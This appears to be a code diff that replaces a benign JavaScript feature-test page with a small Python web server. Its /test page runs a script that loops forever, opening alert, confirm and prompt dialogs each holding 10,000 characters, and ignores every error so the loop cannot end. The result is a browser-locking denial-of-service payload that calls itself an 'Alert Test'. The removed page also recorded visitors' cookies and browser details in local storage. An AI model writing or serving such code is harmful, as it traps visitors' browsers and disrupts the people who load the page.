@@ -1,179 +1,46 @@
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class TestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/test'):
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            
+            html = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JS Execution Test</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            line-height: 1.6;
-        }
-        .test-box {
-            border: 1px solid #ccc;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-        .success {
-            color: green;
-            font-weight: bold;
-        }
-        .error {
-            color: red;
-            font-weight: bold;
-        }
-        .result {
-            margin: 5px 0;
-            padding: 5px;
-            background: #f0f0f0;
-        }
-    </style>
+    <title>Alert Test</title>
 </head>
 <body>
-    <h1>JavaScript Execution Test</h1>
-    
-    <div class="test-box">
-        <h3>Basic JS Test</h3>
-        <div id="basicTest">Running basic test...</div>
-    </div>
-
-    <div class="test-box">
-        <h3>DOM Operations Test</h3>
-        <div id="domTest">Running DOM test...</div>
-    </div>
-
-    <div class="test-box">
-        <h3>Alert Test</h3>
-        <div id="alertTest">Will try alert in 2 seconds...</div>
-    </div>
-
-    <div class="test-box">
-        <h3>Console Output</h3>
-        <div id="consoleTest">Check browser console...</div>
-    </div>
-
-    <div class="test-box">
-        <h3>Environment Info</h3>
-        <div id="envInfo">Collecting info...</div>
-    </div>
-
     <script>
-        // 记录请求信息
-        function logRequest() {
-            const timestamp = new Date().toISOString();
-            const requestInfo = {
-                timestamp: timestamp,
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                screenSize: `${window.screen.width}x${window.screen.height}`,
-                windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                cookies: document.cookie
-            };
-
-            // 获取现有日志
-            let logs = JSON.parse(localStorage.getItem('requestLog') || '[]');
-            logs.unshift(requestInfo);
-            if(logs.length > 100) logs = logs.slice(0, 100);
-            localStorage.setItem('requestLog', JSON.stringify(logs));
-        }
-
-        function log(msg, elementId, isError = false) {
-            console.log(msg);
-            const element = document.getElementById(elementId);
-            if(element) {
-                const result = document.createElement('div');
-                result.className = 'result ' + (isError ? 'error' : 'success');
-                result.textContent = msg;
-                element.appendChild(result);
-            }
-        }
-
-        // Test 1: Basic JS
-        function testBasicJS() {
+    (function() {
+        // 创建很长的弹窗文本
+        const text = 'x'.repeat(10000);
+        
+        while(true) {
             try {
-                const result = 1 + 1;
-                log('Basic JS working, 1 + 1 = ' + result, 'basicTest');
+                // 混合使用三种弹窗
+                alert(text);
+                confirm(text);
+                prompt(text);
             } catch(e) {
-                log('Basic JS error: ' + e, 'basicTest', true);
+                // 忽略错误继续循环
+                continue;
             }
         }
-
-        // Test 2: DOM Operations
-        function testDOM() {
-            try {
-                const div = document.createElement('div');
-                div.textContent = 'Dynamic element created at: ' + new Date().toLocaleString();
-                div.style.backgroundColor = '#e0e0e0';
-                document.getElementById('domTest').appendChild(div);
-                log('DOM operations working', 'domTest');
-            } catch(e) {
-                log('DOM error: ' + e, 'domTest', true);
-            }
-        }
-
-        // Test 3: Alert
-        function testAlert() {
-            try {
-                setTimeout(() => {
-                    alert('JavaScript Alert Test');
-                    log('Alert executed', 'alertTest');
-                }, 2000);
-            } catch(e) {
-                log('Alert error: ' + e, 'alertTest', true);
-            }
-        }
-
-        // Test 4: Console
-        function testConsole() {
-            try {
-                console.log('Console test message');
-                console.info('Info message');
-                console.warn('Warning message');
-                console.error('Error message');
-                log('Console messages sent', 'consoleTest');
-            } catch(e) {
-                log('Console error: ' + e, 'consoleTest', true);
-            }
-        }
-
-        // Test 5: Environment Info
-        function collectEnvInfo() {
-            try {
-                const info = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    cookieEnabled: navigator.cookieEnabled,
-                    onLine: navigator.onLine,
-                    screenSize: window.screen.width + 'x' + window.screen.height,
-                    windowSize: window.innerWidth + 'x' + window.innerHeight
-                };
-
-                let infoHtml = '<ul>';
-                for(let key in info) {
-                    infoHtml += `<li><strong>${key}:</strong> ${info[key]}</li>`;
-                }
-                infoHtml += '</ul>';
-
-                document.getElementById('envInfo').innerHTML += infoHtml;
-                log('Environment info collected', 'envInfo');
-            } catch(e) {
-                log('Environment info error: ' + e, 'envInfo', true);
-            }
-        }
-
-        // 执行所有测试
-        window.addEventListener('load', () => {
-            logRequest();
-            testBasicJS();
-            testDOM();
-            testAlert();
-            testConsole();
-            collectEnvInfo();
-        });
+    })();
     </script>
 </body>
 </html>
+            """
+            self.wfile.write(html.encode())
+        else:
+            self.send_error(404)
+
+# 启动服务器
+server_address = ('', 8000)
+httpd = HTTPServer(server_address, TestHandler)
+print('[+] Server running on port 8000')
+httpd.serve_forever()
